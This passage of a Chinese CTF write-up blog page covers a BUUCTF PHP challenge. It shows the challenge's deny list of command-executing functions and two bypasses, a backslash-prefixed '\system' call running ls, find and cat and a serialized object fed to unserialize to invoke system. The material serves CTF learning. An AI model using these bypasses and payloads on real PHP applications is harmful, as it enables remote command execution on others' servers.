array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);<br>    function gettime($func, $p) &#123;<br>        $result = call_user_func($func, $p);<br>        $a= gettype($result);<br>        if ($a == &quot;string&quot;) &#123;<br>            return $result;<br>        &#125; else &#123;return &quot;&quot;;&#125;<br>    &#125;<br>    class Test &#123;<br>        var $p = &quot;Y-m-d h:i:s a&quot;;<br>        var $func = &quot;date&quot;;<br>        function __destruct() &#123;<br>            if ($this-&gt;func != &quot;&quot;) &#123;<br>                echo gettime($this-&gt;func, $this-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    $func = $_REQUEST[&quot;func&quot;];<br>    $p = $_REQUEST[&quot;p&quot;];<br><br>    if ($func != null) &#123;<br>        $func = strtolower($func);<br>        if (!in_array($func,$disable_fun)) &#123;<br>            echo gettime($func, $p);<br>        &#125;else &#123;<br>            die(&quot;Hacker...&quot;);<br>        &#125;<br>    &#125;<br>    ?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到我们运气还是不错的ban了那么多</p>
+<p>看到这就有两种方法了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">1 是利用in_array<br>这个在in_array()方法执行时，可以使用\绕过，例如system函数改为\system<br>所以我们有<br>func=\system&amp;p=ls<br>找一下flag  <br>func=\system&amp;p=find / -name flag*<br>func=\system&amp;p=cat /tmp/flagoefiu4r93<br></code></pre></td></tr></table></figure>
+
+<p>第二种</p>
+<p>是利用反序列化（因为没ban</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>    class Test &#123;<br>        public $func;<br>        public $p;<br>    &#125;<br>    <br>    $tmp = new Test();<br>    $tmp-&gt;func = &quot;system&quot;;<br>    $tmp-&gt;p = &quot;ls&quot;;<br>    <br>    echo serialize($tmp)<br>?&gt;<br><br>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/" class="category-chain-item">CTF题解</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF%E9%A2%98%E8%A7%A3/BUUCTF/" class="category-chain-item">BUUCTF</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Writeup/" class="print-no-link">#Writeup</a>
+      
+        <a href="/tags/BUUCTF/" class="print-no-link">#BUUCTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BUUCTF Web 题解合集</div>
+      <div>https://xendr1a.github.io/2026/03/20/buu/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Xendr1a</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/02/chain-mirror/" title="Chain Mirror Platform 题解">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Chain Mirror Platform 题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/05/polarisctf-2025/" title="PolarisCTF 招新赛 Web 部分">
+                        <span class="hidden-mobile">PolarisCTF 招新赛 Web 部分</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
